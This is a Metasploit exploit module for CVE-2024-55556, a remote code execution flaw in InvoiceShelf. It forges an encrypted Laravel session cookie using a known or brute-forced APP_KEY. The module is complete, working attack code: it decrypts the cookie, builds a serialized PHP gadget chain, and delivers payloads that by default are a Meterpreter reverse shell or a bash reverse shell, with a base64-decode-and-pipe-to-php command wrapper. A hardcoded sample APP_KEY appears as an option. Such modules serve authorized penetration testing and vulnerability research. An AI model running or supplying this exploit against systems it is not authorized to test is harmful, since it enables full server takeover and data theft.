##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::LaravelCryptoKiller
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'InvoiceShelf unauthenticated PHP Deserialization Vulnerability',
        'Description' => %q{
          InvoiceShelf is an open-source web & mobile app that helps you track expenses, payments, create professional
          invoices & estimates and is based on the PHP framework Laravel.
          InvoiceShelf has a Remote Code Execution vulnerability that allows remote unauthenticated attackers to conduct
          PHP deserialization attacks. This is possible when the `SESSION_DRIVER=cookie` option is set on the default
          InvoiceShelf .env file meaning that any session will be stored as a ciphered value inside a cookie.
          These sessions are made from a specially crafted JSON containing serialized data which is then ciphered using
          Laravel's encrypt() function.
          An attacker in possession of the `APP_KEY` would therefore be able to retrieve the cookie, uncipher it and modify
          the serialized data in order to get arbitrary deserialization on the affected server, allowing them to achieve
          remote command execution. InvoiceShelf version `1.3.0` and lower is vulnerable.
          As it allows remote code execution, adversaries could exploit this flaw to execute arbitrary commands,
          potentially resulting in complete system compromise, data exfiltration, or unauthorized access
          to sensitive information.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Rémi Matasse', # SynActiv Research Team - discovery of the vulnerability
          'Mickaël Benassouli' # SynActiv Research Team - discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2024-55556'],
          ['URL', 'https://attackerkb.com/topics/25C8UQRPhx/cve-2024-55556'],
          ['URL', 'https://www.synacktiv.com/advisories/crater-invoice-unauthenticated-remote-command-execution-when-appkey-known']
        ],
        'DisclosureDate' => '2024-12-13',
        'Platform' => ['php', 'unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix/Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 90
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The InvoiceShelf endpoint URL.', '/' ]),
      OptString.new('APP_KEY', [ true, 'Laravel APP_KEY.', 'base64:kgk/4DW1vEVy7aEvet5FPp5un6PIGe/so8H0mvoUtW0=']),
      OptPath.new('BRUTEFORCE', [false, 'File with a list of APP_KEYs, one per line for a bruteforce attack.', nil])
    ])
  end

  def execute_command(laravel_cookie_cipher, laravel_cookie, laravel_session_cookie, _opts = {})
    laravel_cookie_id = laravel_cookie.split('=')[0]
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'cookie' => "#{laravel_session_cookie}; #{laravel_cookie_id}=#{laravel_cookie_cipher};",
      'ctype' => 'application/x-www-form-urlencoded'
    })
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'app', 'version')
    })
    return CheckCode::Unknown('No valid response received from target.') unless res&.code == 200

    # check if target is running the InvoiceShelf platform
    # parse json response and get the version
    res_json = res.get_json_document
    version_number = res_json['version'] unless res_json.blank?
    return CheckCode::Safe('No InvoiceShelf platform found.') if version_number.nil?

    if Rex::Version.new(version_number) <= Rex::Version.new('1.3.0')
      return CheckCode::Appears("InvoiceShelf #{version_number}")
    end

    CheckCode::Safe("InvoiceShelf #{version_number}")
  end

  def exploit
    # lets first check if decryption is successful with the APP_KEY by decrypting the Laravel cookie.
    # option APP_KEY is either a single entry of a file with APP_KEYS using the [file:] identifier
    cipher_mode = 'AES-256-CBC'
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    fail_with(Failure::Unknown, 'No valid response received from target.') unless res&.code == 200

    print_status('Lets check if the APP_KEY(s) is/are valid by decrypting the cookie.')
    print_status('Grabbing the cookies.')
    set_cookie = res.get_cookies
    fail_with(Failure::NotFound, 'No cookie found.') if set_cookie.nil?
    laravel_session_cookie = set_cookie.match(/laravel_session=([^;]+)/) # get laravel_session cookie
    laravel_cookie = set_cookie.match(/\w{40}=([^;]+)/) # search for the 40 alphanumeric cookie identifier
    fail_with(Failure::NotFound, 'No cookie found. Unable to check APP_KEY.') if laravel_session_cookie.nil? || laravel_cookie.nil?

    if datastore['BRUTEFORCE']
      key_file = datastore['BRUTEFORCE']
      print_status("Starting bruteforce decryption with APP_KEYS listed in #{key_file}.")
      result = laravel_bruteforce_from_file(laravel_cookie[1], key_file, cipher_mode)
      fail_with(Failure::NotFound, "Bruteforce decryption failed. No valid APP_KEY found in file #{key_file}.") if result.nil?
      valid_app_key = result['key']
      unciphered_value = result['value']
    else
      result = laravel_decrypt(laravel_cookie[1], datastore['APP_KEY'], cipher_mode)
      fail_with(Failure::BadConfig, "Decryption with APP_KEY: #{datastore['APP_KEY']} failed.") if result.nil?
      valid_app_key = datastore['APP_KEY']
      unciphered_value = result
    end
    print_good("APP_KEY is valid: #{valid_app_key}")
    print_good("Unciphered value: #{unciphered_value}")

    print_status('Generate an encrypted serialized cookie payload with our cracked APP_KEY.')
    pl = payload.encoded
    pl = "echo -n '#{Base64.strict_encode64(payload.encoded)}'|(base64 -d||openssl enc -base64 -d)|php" if target['Type'] == :php
    pl_len = pl.length
    laravel_payload = %(a:2:{i:7;O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"\x00*\x00events";O:35:"Illuminate\\Database\\DatabaseManager":2:{s:6:"\x00*\x00app";a:1:{s:6:"config";a:2:{s:16:"database.default";s:6:"system";s:20:"database.connections";a:1:{s:6:"system";a:1:{i:0;s:#{pl_len}:"#{pl}";}}}}s:13:"\x00*\x00extensions";a:1:{s:6:"system";s:12:"array_filter";}}}i:7;i:7;})
    b64_laravel_payload = Base64.strict_encode64(laravel_payload)
    hash_value = unciphered_value.split('|')[0]
    laravel_cookie_cipher = laravel_encrypt_session_cookie(b64_laravel_payload, hash_value, valid_app_key, cipher_mode)
    fail_with(Failure::BadConfig, 'Laravel cookie encryption failed.') if laravel_cookie_cipher.nil?

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    execute_command(laravel_cookie_cipher, laravel_cookie[0], laravel_session_cookie[0])
  end
end
